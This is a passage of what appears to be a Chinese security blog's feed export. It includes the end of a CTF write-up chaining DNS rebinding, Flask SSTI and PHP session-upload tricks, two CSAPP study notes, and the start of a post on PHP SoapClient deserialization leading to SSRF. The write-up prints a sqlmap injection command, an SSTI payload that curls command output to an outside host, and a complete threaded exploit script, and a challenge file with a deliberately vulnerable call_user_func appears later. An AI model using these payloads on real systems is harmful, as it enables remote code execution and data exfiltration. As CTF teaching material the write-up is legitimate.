__name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">python sqlmap.py -u "http://localhost:5000/?username=*" --technique=T --dbms=mysql --dbs  --level 1 --time-sec=2</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="韩国鱼"><a href="#韩国鱼" class="headerlink" title="韩国鱼"></a>韩国鱼</h2><blockquote><p>DNS rebinding、SSTI、命令执行</p></blockquote><p>题目直接放出了 docker 环境，有个 readflag.c，看来是要执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'default_socket_timeout'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$waf = <span class="keyword">array</span>(<span class="string">"@"</span>,<span class="string">"#"</span>,<span class="string">"!"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&lt;"</span>, <span class="string">"*"</span>, <span class="string">"'"</span>, <span class="string">"&amp;"</span>, <span class="string">".."</span>, <span class="string">"localhost"</span>, <span class="string">"file"</span>, <span class="string">"gopher"</span>, <span class="string">"flag"</span>, <span class="string">"information_schema"</span>, <span class="string">"select"</span>, <span class="string">"from"</span>, <span class="string">"sleep"</span>, <span class="string">"user"</span>, <span class="string">"where"</span>, <span class="string">"union"</span>, <span class="string">".php"</span>, <span class="string">"system"</span>, <span class="string">"access.log"</span>, <span class="string">"passwd"</span>, <span class="string">"cmdline"</span>, <span class="string">"exe"</span>, <span class="string">"fd"</span>, <span class="string">"meta-data"</span>);</span><br><span class="line"></span><br><span class="line">$dst = @$_GET[<span class="string">'🇰🇷🐟'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($dst)) <span class="keyword">exit</span>(<span class="string">"Forbidden"</span>);</span><br><span class="line"></span><br><span class="line">$res = @parse_url($dst);</span><br><span class="line">$ip = @dns_get_record($res[<span class="string">'host'</span>], DNS_A)[<span class="number">0</span>][<span class="string">'ip'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($res[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $res[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($waf); $i++) </span><br><span class="line">    <span class="keyword">if</span>(stripos($dst, $waf[$i]) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;svg/onload=\"alert('發大財!')\"&gt;"</span>.$waf[$i]);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// u can only touch this useless ip :p</span></span><br><span class="line">$dev_ip = <span class="string">"54.87.54.87"</span>;</span><br><span class="line"><span class="keyword">if</span>($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外内网里还跑了一个 flask，这段代码明显有 SSTI。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br></pre></td></tr></table></figure><p>代码里还很贴心的加入了一个 <code>sleep(1)</code>，对访问 IP 的限制显然可以通过 DNS rebinding 进行绕过。当服务端通过 <code>dns_get_record</code> 解析时，返回 <code>54.87.54.87</code>，通过 <code>file_get_contents</code> 访问时，host 被解析成 <code>127.0.0.1</code> 自然就能打到内网。</p><p>国内能买到的域名 TTL 基本无法为零，难道需要充钱买新域名吗？</p><p>不，有很多现成的平台能用，比如 <a href="https://lock.cmpxchg8b.com/rebinder.html。" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.html。</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wshvl45cj211k06b74t.jpg" alt="image.png"></p><p>不过这个是规律性的随机解析，还是要点小运气的 ：）</p><p>可看到成功进入内网：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wsuzjn1yj20v80bpt9z.jpg" alt="image.png"></p><p>要想访问 <code>/error_page</code> ，这还有点小限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br></pre></td></tr></table></figure><p>不过在 Flask 里有个特性，<code>//korea/error_page</code> =&gt; <code>/error_page</code>，自然就解决了。当然也可以自己写个跳转。</p><p>另外还有一点：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import os</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; os.path.join(<span class="string">"/var/www/flask"</span>, <span class="string">"error"</span>, <span class="string">"/etc/passwd"</span>)</span><br><span class="line"><span class="string">'/etc/passwd'</span></span><br></pre></td></tr></table></figure><p>接下来要做的就是找到一个可控的文件，别忘了前面还跑了个 PHP，那就利用 <code>session.upload_progress</code> 进行上传吧，也是常见的手段。可参考：</p><p><a href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html" target="_blank" rel="noopener">https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html</a></p><p><a href="https://www.anquanke.com/post/id/162656" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162656</a></p><p><a href="http://wonderkun.cc/index.html/?p=718" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=718</a></p><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a></p><p>我们先看一下 SSTI 如何构造才能进行命令执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">过滤 &#123;&#123;  =&gt;  &#123;%%&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤  .  =&gt; </span></span><br><span class="line"><span class="string">            &#123;&#123;''['__class__']&#125;&#125;</span></span><br><span class="line"><span class="string">            &#123;&#123;''|attr('__class__')&#125;&#125;</span></span><br><span class="line"><span class="string">            \x2e</span></span><br><span class="line"><span class="string">            getattr</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用 payload</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">      &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">        &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [][<span class="string">'__class__'</span>][<span class="string">'__base__'</span>][<span class="string">'__subclasses__'</span>]() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c[<span class="string">'__name__'</span>] == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">        &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c[<span class="string">'__init__'</span>][<span class="string">'__globals__'</span>][<span class="string">'values'</span>]() %&#125;</span><br><span class="line">            &#123;% <span class="keyword">if</span> b[<span class="string">'__class__'</span>]==&#123;&#125;[<span class="string">'__class__'</span>] %&#125;</span><br><span class="line">                &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b[<span class="string">'keys'</span>]() %&#125;</span><br><span class="line">                &#123;% <span class="keyword">if</span> b[<span class="string">'eval'</span>](<span class="string">'getattr(__import__("os"),"popen")("curl your_host/`/readflag`")'</span>) %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>把 orange 之前 one line php 的 exp 改下就能用了，最终 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish.balsnctf.com'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">    &#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">        &#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">            &#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if b['eval']('getattr(__import__("os"),"popen")("curl your_host/`/readflag`")') %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">    &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Warm-up&quot;&gt;&lt;a href=&quot;#Warm-up&quot; class=&quot;headerlink&quot; title=&quot;Warm up&quot;&gt;&lt;/a&gt;Warm up&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;常见绕过、gopher 打 MySQL、SSRF&lt;/p&gt;
&lt;/blockq
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 信息的表示和处理 笔记</title>
    <link href="https://wywwzjj.top/2019/09/08/CSAPP-Chapter-2-Notes/"/>
    <id>https://wywwzjj.top/2019/09/08/CSAPP-Chapter-2-Notes/</id>
    <published>2019-09-08T15:33:45.000Z</published>
    <updated>2019-10-11T14:32:14.122Z</updated>
    
    <content type="html"><![CDATA[<p>信息的表示是信息处理的基础。</p><p>计算机存储和处理的信息都是以二进制的形式表示，这与底层的物理结构有关。</p><blockquote><p>单个的位不是非常有用，然而，当把位组合在一起，再加上某种<em>解释</em>，即赋予不同的可能位模式以含义，我们就能够表示任何有限集合的元素。</p></blockquote><p>进一步的问题就是编码和解码，比如数据与文字该如何表示？</p><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><p>大多数计算机使用 8 位的块，作为最小的可寻址的内存单位（字节），而不是访问内存中单独的位。机械级程序将内存视为一个非常大的字节数组，称为虚拟内存。内存的每个字节都由一个唯一的数字来标识，该数字被称为<strong>地址</strong>，所有可能地址的集合称为<strong>虚拟地址空间</strong>。</p><p>十六进制表示，记一下 A、C、F 对应的十进制就好了。</p><blockquote><p>每当想起这些简单的算数、逻辑运算撑起了复杂抽象的信息处理，就不免感慨其神奇，万丈高楼平地起。</p></blockquote><h2 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h2><p>这些数值表示及其运算在学组原时就整理过好几遍了，没细看，回头想起再补充吧。</p><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;信息的表示是信息处理的基础。&lt;/p&gt;
&lt;p&gt;计算机存储和处理的信息都是以二进制的形式表示，这与底层的物理结构有关。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;单个的位不是非常有用，然而，当把位组合在一起，再加上某种&lt;em&gt;解释&lt;/em&gt;，即赋予不同的可能位模式以含义，我们就能
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 计算机系统漫游 笔记</title>
    <link href="https://wywwzjj.top/2019/09/01/CSAPP-Chapter-1-Notes/"/>
    <id>https://wywwzjj.top/2019/09/01/CSAPP-Chapter-1-Notes/</id>
    <published>2019-09-01T09:08:23.000Z</published>
    <updated>2019-12-19T06:28:44.833Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我听到的我会忘记</p><p>我看到的我能记住</p><p>只有我做过的，我才能理解</p></blockquote><p>CSAPP 最大的魅力在于，每章的前言会站在程序员的角度跟你分析，为什么要学这些知识，然后在正文里清晰的阐述这些问题的答案。</p><p><strong>操作系统是什么？提供了什么功能？</strong></p><ul><li><p>用户角度：操作系统是一个控制软件</p><ul><li>管理应用程序</li><li>为应用程序提供公共服务（比如底层的 IO、以及网络协议栈等各种底层 API）</li><li>进程管理</li></ul></li><li><p>硬件角度：资源管理</p><ul><li>管理外设、分配资源<ul><li>CPU 调度器</li><li>物理内存管理</li><li>虚拟内存管理</li><li>文件系统管理</li><li>中断处理与设备驱动</li></ul></li></ul></li><li><p>所处位置：硬件之上，应用程序之下</p></li><li><p>操作系统内核特征</p><ul><li>并发（注意区分并发与并行，并发强调的是一段时间，并行是一个时间点，所以并行必须是多核）</li><li>共享：<ul><li>“同时”访问</li><li>互斥共享</li></ul></li><li>虚拟（为上层提供底层的抽象）</li><li>异步</li></ul></li><li><p>内核时被信任的第三方</p></li><li><p>只有内核可以执行特权指令</p></li></ul><p>操作系统实验：</p><ul><li>系统启动及中断</li><li>物理内存管理</li><li>虚拟内存管理</li><li>内核线程管理</li><li>用户进程管理</li><li>CPU 调度</li><li>同步与互斥</li><li>文件系统</li></ul><h2 id="信息-位-上下文"><a href="#信息-位-上下文" class="headerlink" title="信息 = 位 + 上下文"></a>信息 = 位 + 上下文</h2><p>编码是一切信息处理的基础。</p><h2 id="程序被其他程序翻译成不同的格式"><a href="#程序被其他程序翻译成不同的格式" class="headerlink" title="程序被其他程序翻译成不同的格式"></a>程序被其他程序翻译成不同的格式</h2><p><strong>编译过程：</strong></p><p>源程序（hello.c）=&gt; 预处理器 （hello.i） =&gt;  编译器（hello.s）  =&gt;  汇编器（hello.o）  =&gt;  链接器（可执行）</p><ul><li>预处理：以 # 开头的，直接修改源程序。比如 #include &lt;stdio.h&gt;，将直接把文件插入进来。</li><li>编译器：将此文本文件翻译成汇编语句。</li><li>汇编器：将汇编语句翻译成机器语言指令。</li><li>链接器：将用到的链接库合并。</li></ul><h2 id="了解编译系统如何工作大有益处"><a href="#了解编译系统如何工作大有益处" class="headerlink" title="了解编译系统如何工作大有益处"></a>了解编译系统如何工作大有益处</h2><ul><li>优化程序性能</li><li>理解链接时出现的错误</li><li>避免安全漏洞</li></ul><h2 id="处理器读并解释储存在内存中的指令"><a href="#处理器读并解释储存在内存中的指令" class="headerlink" title="处理器读并解释储存在内存中的指令"></a>处理器读并解释储存在内存中的指令</h2><h3 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h3><p>计算机：</p><ul><li>以硬件为基础</li><li>以软件扩充其功能</li><li>以执行程序的方式提现功能</li></ul><p>组成：</p><ul><li>总线：bus，各部件信息传输的渠道</li><li>I/O 设备：输入输出设备。输入信息  =&gt;  处理信息  =&gt;  输出信息</li><li>主存</li><li>处理器</li></ul><h3 id="运行-hello-程序"><a href="#运行-hello-程序" class="headerlink" title="运行 hello 程序"></a>运行 hello 程序</h3><h2 id="高速缓存至关重要"><a href="#高速缓存至关重要" class="headerlink" title="高速缓存至关重要"></a>高速缓存至关重要</h2><h2 id="存储设备形成层次结构"><a href="#存储设备形成层次结构" class="headerlink" title="存储设备形成层次结构"></a>存储设备形成层次结构</h2><h2 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>一个进程可以由多个线程构成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>为每个进程提供了一个假象，就好像每个进程都独占了主存。</p><p>每个程序执行时，内存起点都是一样的。</p><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h2 id="系统之间利用网络通信"><a href="#系统之间利用网络通信" class="headerlink" title="系统之间利用网络通信"></a>系统之间利用网络通信</h2><h2 id="Amdahl-定律"><a href="#Amdahl-定律" class="headerlink" title="Amdahl 定律"></a>Amdahl 定律</h2><h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><h2 id="抽象的重要性"><a href="#抽象的重要性" class="headerlink" title="抽象的重要性"></a>抽象的重要性</h2><p>CPU =&gt; 进程</p><p>磁盘 =&gt; 文件</p><p>内存 =&gt; 地址空间</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;我听到的我会忘记&lt;/p&gt;
&lt;p&gt;我看到的我能记住&lt;/p&gt;
&lt;p&gt;只有我做过的，我才能理解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CSAPP 最大的魅力在于，每章的前言会站在程序员的角度跟你分析，为什么要学这些知识，然后在正文里清晰的阐述这些问题
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>当 PHP 反序列化遇上 SSRF</title>
    <link href="https://wywwzjj.top/2019/08/20/%E5%BD%93PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%81%87%E4%B8%8ASSRF/"/>
    <id>https://wywwzjj.top/2019/08/20/当PHP反序列化遇上SSRF/</id>
    <published>2019-08-20T06:08:23.000Z</published>
    <updated>2019-11-04T02:25:43.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SOAP-简介"><a href="#SOAP-简介" class="headerlink" title="SOAP 简介"></a>SOAP 简介</h2><p>SOAP（Simple Object Access Protocol）是一种在 web service 通信时所用的基于 xml 的协议。</p><p>远在天边，近在眼前，通过这种协议可以实现“本地”调用的效果。</p><p><strong>简单实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// soapServer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> date(<span class="string">'Y-m-d'</span>, time());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$soap = <span class="keyword">new</span> SoapServer(<span class="keyword">null</span>,</span><br><span class="line">                      [<span class="string">'uri'</span> =&gt; <span class="string">'abcd'</span>]  <span class="comment">// namespace of the SOAP service</span></span><br><span class="line">                      );</span><br><span class="line">$soap-&gt;addFunction(<span class="string">'getTime'</span>);</span><br><span class="line">$soap-&gt;handle();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// soapClient</span></span><br><span class="line">$client = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,</span><br><span class="line">                        [<span class="string">'location'</span> =&gt; <span class="string">'http://example.com'</span>,  <span class="comment">// 服务端 URL</span></span><br><span class="line">                         <span class="string">'uri'</span> =&gt; <span class="string">'abcd'</span>]  <span class="comment">// 需要与服务端一致（只发起请求可以随意填）</span></span><br><span class="line">                        );</span><br><span class="line"><span class="keyword">echo</span> $client-&gt;getTime();  <span class="comment">// 得到服务端所返回的时间</span></span><br><span class="line"><span class="comment">// 这里非常重要，是反序列化到 SSRF 的核心（实际操作可调用任意方法）</span></span><br><span class="line"><span class="comment">// 这里调用了未定义的方法将唤起 __call 魔术方法，从而向 server 端发起一个请求，实现 SSRF 的效果</span></span><br></pre></td></tr></table></figure><p>还有一个很重要的利用点，CRLF 头注入，一个在 user_agent，一个在 uri，可惜的是这种方式只支持 http 协议。</p><p>下面来看一看具体的数据包：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y507mxzpj20lf07bt95.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y4o21s5fj20la08qt97.jpg" alt></p><p>不熟悉 CRLF 头注入利用方法的可以参考一下这篇文章，<a href="https://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html" target="_blank" rel="noopener">Trying to hack Redis via HTTP requests</a></p><h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><h3 id="2018-LCTF-babyphp’s-revenge"><a href="#2018-LCTF-babyphp’s-revenge" class="headerlink" title="2018 LCTF babyphp’s revenge"></a>2018 LCTF babyphp’s revenge</h3><blockquote><p>hint：反序列化</p></blockquote><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, 